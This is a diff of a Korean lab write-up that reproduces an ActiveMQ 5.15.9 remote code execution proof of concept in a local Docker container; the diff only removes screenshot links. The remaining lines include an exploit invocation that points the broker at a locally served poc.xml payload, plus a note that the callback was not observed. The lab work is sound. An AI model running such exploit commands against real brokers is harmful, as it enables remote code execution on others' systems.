@@ -36,7 +36,6 @@ docker run -d --name activemq -p 8161:8161 -p 61616:61616 rmohr/activemq:5.15.9-
 docker pull rmohr/activemq:5.15.9-alpine
 ```
 
-![image.png](attachment:d2de9fca-87f8-4c66-b818-98fb9c4329be:image.png)
 
 ---
 
@@ -46,7 +45,6 @@ docker pull rmohr/activemq:5.15.9-alpine
 docker ps
 ```
 
-![image.png](attachment:db88bac1-e59a-4791-ae59-be53be6a893b:image.png)
 
 ---
 
@@ -54,7 +52,6 @@ docker ps
 
 - `http://localhost:8161` 접속
 
-![image.png](attachment:e2504549-6ea1-417d-b35f-7a9b5486b713:image.png)
 
 ---
 
@@ -86,7 +83,6 @@ docker ps
 python -m http.server 8000
 ```
 
-![image.png](attachment:96686567-05ea-418b-bf22-28ae90fc7595:image.png)
 
 ---
 
@@ -98,13 +94,11 @@ python -m http.server 8000
 python exploit.py -i 127.0.0.1 -p 61616 -u http://127.0.0.1:8000/poc.xml
 ```
 
-![image.png](attachment:49f3f1dd-4112-4d57-8361-4042818df9f8:image.png)
 
 ---
 
 ### ✅ 공격 성공 여부 확인
 
-![image.png](attachment:e90c76a8-62cc-4f93-89d6-e0871b63520a:image.png)
 
 - 실습 당시 Interactsh가 도메인을 발급하지 못해 실제 요청 수신 로그는 확인하지 못하였지,  exploit 스크립트가 정상 동작하고 서버 응답도 있었기 때문에 PoC 실행 흐름은 재현을 완료하였습니다.
 
